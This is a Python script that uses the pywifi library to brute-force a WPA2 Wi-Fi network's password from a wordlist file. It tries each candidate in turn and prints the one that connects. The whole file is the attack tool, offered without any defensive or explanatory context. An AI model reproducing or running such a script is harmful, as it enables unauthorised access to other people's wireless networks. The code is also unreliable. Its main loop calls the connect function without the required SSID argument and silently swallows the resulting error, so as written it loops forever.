import pywifi
from pywifi import const
import time

def wifiConnect(pwd, maxtime, ssid):
        wifi = pywifi.PyWiFi()
        ifaces = wifi.interfaces()[0]
        ifaces.disconnect()
        time.sleep(1)
        wifistatus = ifaces.status()
        if wifistatus == const.IFACE_DISCONNECTED:
            profile = pywifi.Profile()

            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key=pwd

            ifaces.remove_all_network_profiles()
            tep_profile = ifaces.add_network_profile(profile)
            ifaces.connect(tep_profile)
            time.sleep(maxtime)
            if ifaces.status() == const.IFACE_CONNECTED:
                return True
            else:
                return False

        else:
            print("Connected")


def run(passwords_dic, maxtime):
    print("start")
    path = passwords_dic
    file = open(path, "r")
    while True:
        try:
            pad = file.readline()
            bool = wifiConnect(pad, maxtime)
            if bool:
                print(pad)
                break
            else:
                print("Ing...")

        except:
            continue


